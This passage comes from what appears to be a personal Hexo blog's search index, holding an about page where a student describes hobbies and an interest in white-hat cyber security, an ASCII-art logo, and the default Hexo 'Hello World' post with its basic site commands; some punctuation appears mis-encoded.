Game)ï¼ŒSports(especially basketball)ï¼Œ Parkourï¼Œ Movie and Piano Music.\nAnd I wanna try to know everything. The world is so Magicï¼Œisn't it ?\nAs for programmingï¼Œ I have learned javaã€python and some cpp.\nwhy i choose cyber securityï¼Ÿ When many people talk about this, they may think it as hacker (really more as cracker).But that's one for me.Be a hacker, be free, to think deep.\nOn the other hand , that's what I ever read.A Hacker is more like an assassin as the Assassin's Creed.And my favorite : We walk in the darkness to serve the light.\nI think that's what white hat like.They work in the cyber where we couldn't see to secure our security.\nAbout this blog This blog is used to record my life and learning and some magic.\nIt is powered by Hexo and the theme is NexT, thanks to their developers.\nYou can find articles by categories and tags. You can subscribe my blog by RSS.\n .:okOOOkdc' 'cdkOOOko:. .xOOOOOOOOOOOOc cOOOOOOOOOOOOx. :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO: 'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO' oOOOOOOOO. .oOOOOoOOOOl. ,OOOOOOOOo dOOOOOOOO. .cOOOOOc. ,OOOOOOOOx lOOOOOOOO. ;d; ,OOOOOOOOl .OOOOOOOO. .; ; ,OOOOOOOO. cOOOOOOO. .OOc. 'oOO. ,OOOOOOOc oOOOOOO. .OOOO. :OOOO. ,OOOOOOo lOOOOO. .OOOO. :OOOO. ,OOOOOl ;OOOO' .OOOO. :OOOO. ;OOOO; .dOOo .OOOOocccxOOOO. xOOd. ,kOl .OOOOOOOOOOOOO. .dOk, :kk;.OOOOOOOOOOOOO.cOk: ;kOOOOOOOOOOOOOOOk: ,xOOOOOOOOOOOx, .lOOOOOOOl. ,dOd, . ","description":"","tags":null,"title":"about","uri":"/about/"},{"categories":null,"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start Create a new post 1  $ hexo new \"My New Post\"   More info: Writing\nRun server 1  $ hexo server   More info: Server\nGenerate static files 1  $ hexo generate   More info: Generating\nDeploy to remote sites 1  $ hexo deploy   More info: Deployment\n","description":"","tags":null,"title":"Hello World","uri":"/posts/hello-world/"}]